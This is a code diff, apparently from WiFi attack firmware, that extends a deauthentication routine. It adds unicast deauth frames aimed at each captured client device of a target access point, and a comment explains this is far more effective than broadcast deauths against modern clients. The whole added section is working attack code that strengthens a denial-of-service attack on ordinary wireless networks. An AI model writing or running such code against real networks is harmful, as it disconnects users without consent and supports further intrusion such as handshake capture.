@@ -13852,6 +13852,24 @@ void WiFiScan::main(uint32_t currentTime)
           for (int r = 0; r < 55; r++) {
             this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes, false);
           }
+          // ALSO hit every client we actually captured for this AP with a
+          // UNICAST deauth. Broadcast deauths are widely ignored by modern
+          // clients; a unicast frame addressed to the real client MAC is far more
+          // effective (short of PMF/802.11w, which defeats all deauth). Clients
+          // are captured by an AP+STA ("Sniff Stations") scan; this safely
+          // no-ops when none were captured (null list) and bounds-checks the
+          // station indices.
+          if (access_point.stations != nullptr) {
+            for (int x = 0; x < access_point.stations->size(); x++) {
+              uint16_t sidx = access_point.stations->get(x);
+              if (sidx < stations->size()) {
+                Station sta = stations->get(sidx);   // copy; mac must outlive TX
+                for (int r = 0; r < 15; r++)
+                  this->sendDeauthFrame(access_point.bssid, access_point.channel,
+                                        sta.mac, false);
+              }
+            }
+          }
         }
       }
     }
